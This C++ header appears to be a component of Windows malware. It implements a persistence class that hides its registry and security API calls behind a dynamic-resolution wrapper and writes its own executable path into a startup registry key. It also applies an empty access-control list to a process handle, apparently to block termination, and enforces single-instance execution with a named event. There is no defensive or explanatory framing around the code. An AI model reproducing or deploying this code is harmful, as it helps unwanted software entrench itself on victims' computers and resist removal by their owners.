#pragma once

#include <Windows.h>
#include <aclapi.h>

#include "API.hpp"


#define INSTALL 1
#define UNINSTALL 0

template <class T> class LockPersist
{
private:
	T DoesKeyExist(HKEY hKeyClass, wchar_t *SubKey, wchar_t *KeyName)
	{
		HKEY hKey = NULL;
		T tReturn = 0;

		if (API<DWORD>("advapi32.dll", "RegOpenKeyExW")(5, hKeyClass, SubKey, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
		{
			if (API<DWORD>("advapi32.dll", "RegQueryValueExW")(6, hKey, KeyName, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				tReturn = 1;
			API<void>("advapi32.dll", "RegCloseKey")(1, hKey);
		}
		return tReturn;
	}
	T CreateRegKey(HKEY hKeyClass, wchar_t *SubKey, wchar_t *KeyName, wchar_t *KeyValue)
	{
		bool tReturn = 0;
		TCHAR cValue[MAX_PATH];
		wsprintfW(cValue, L"\"%s\"", KeyValue);
		
		HKEY hKey = NULL;
		DWORD dwSizeOfValue = lstrlenW(cValue)*2;

		if (API<DWORD>("advapi32.dll", "RegCreateKeyExW")(9, hKeyClass, SubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_QUERY_VALUE | KEY_READ | KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
		{
			if (API<DWORD>("advapi32.dll", "RegSetValueExW")(6, hKey, KeyName, 0, REG_SZ, (BYTE*)cValue, dwSizeOfValue) == ERROR_SUCCESS)
				tReturn = 1;
			API<void>("advapi32.dll", "RegFlushKey")(1, hKey);
			API<void>("advapi32.dll", "RegCloseKey")(1, hKey);
		}

		return tReturn;
	}

public:
	T AddRemoveStartup(int Action, HKEY hKeyClass, wchar_t *SubKey, wchar_t *KeyName)
	{
		HKEY hKey = NULL;
		T tReturn = 0;
		if (Action == UNINSTALL)
		{
			if (API<DWORD>("advapi32.dll", "RegOpenKeyExW")(5, hKeyClass, SubKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
			{
				if (API<DWORD>("advapi32.dll", "RegDeleteValueW")(2, hKey, KeyName) == ERROR_SUCCESS)
					tReturn = TRUE;

				API<void>("advapi32.dll", "RegFlushKey")(1, hKey);
				API<void>("advapi32.dll", "RegCloseKey")(1, hKey);
			}
			return tReturn;
		}
		else if (Action == INSTALL)
		{
			WCHAR path[MAX_PATH];
			HMODULE hModule = GetModuleHandleW(NULL);
			GetModuleFileNameW(hModule, path, MAX_PATH);
			this->CreateRegKey(hKeyClass, SubKey, KeyName, path);
		}
	}

	T HandlePersistence(HANDLE hObject)
	{
		PACL dwProcACL;
		DWORD dwErr;

		dwProcACL = (PACL)malloc(sizeof(ACL));
		if (!API<BOOL>("advapi32.dll", "InitializeAcl")(3, dwProcACL, sizeof(ACL), ACL_REVISION))
		{
			dwErr = API<DWORD>("kernel32.dll", "GetLastError")(0);
		}
		else
		{
			dwErr = API<DWORD>("advapi32.dll", "SetSecurityInfo")(7, hObject, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, dwProcACL, NULL);
		}
		free(dwProcACL);
		return dwErr;
	}

	T Mutex(wchar_t *MutexName)
	{
		HANDLE hEvent = NULL;
		hEvent = CreateEventW(NULL, 0, 0, MutexName);
		if ((hEvent == NULL) || (GetLastError() == ERROR_ALREADY_EXISTS))
		{
			ExitProcess(0);
		}
		return 1;
	}

};